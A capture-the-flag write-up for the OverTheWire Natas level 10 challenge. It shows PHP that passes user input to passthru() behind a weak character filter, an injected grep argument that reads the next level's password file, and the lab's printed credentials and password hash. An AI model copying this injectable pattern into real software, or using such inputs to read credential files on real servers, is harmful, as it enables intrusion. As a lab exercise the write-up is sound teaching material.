This is a solution guide to the Natas10 Level at [overthewire](http://natas10.natas.labs.overthewire.org). This write-up was created on 28 September 2015.

First connect to the website
<ul><li>http://natas10.natas.labs.overthewire.org</li>
<li>Enter the following as the username natas9 and password nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu</li></ul>

Let's begin first by clicking on view source and examining the code for this level.
{% highlight php linenos %}
<?php
$key = "";
 
if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }}?>
{% endhighlight %}

This challenge is very similar to the last challenge except that it filters and checks for the following characters <code>[;|&]</code>. After the check it still uses the same php function called *passthru()*. If you want to learn more about *passthru()* check out this [link](http://php.net/manual/en/function.passthru.php). So now we have to find a way to send *passthru()* a command which will show us the flag inside /etc/natas_webpass/natas11.

This time we are going to send grep an actual valid command to search for our key. You can find more about grep [here](http://www.tutorialspoint.com/unix_commands/grep.htm). Of note we know that we don't have to worry about case due to the *-i* switch, and we also know that grep expects to have a pattern to search for followed by a named input file. So let's try searching for all text with .* in the /etc/natas_webpass/natas11 directory. Now let's place the crafted input into the search field:

<code> .* /etc/natas_webpass/natas11 #</code>

Which returns our password on the last line:
<figure class="highlight"><pre><code class="language-text" data-lang="text">.htaccess:AuthType Basic
.htaccess: AuthName "Authentication required"
.htaccess: AuthUserFile /var/www/natas/natas10//.htpasswd
.htaccess: require valid-user
.htpasswd:natas10:$1$sDWfJg4Y$ewf9jvw0ChWUA3KARHisg.
/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK</code></pre></figure>

The password is natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
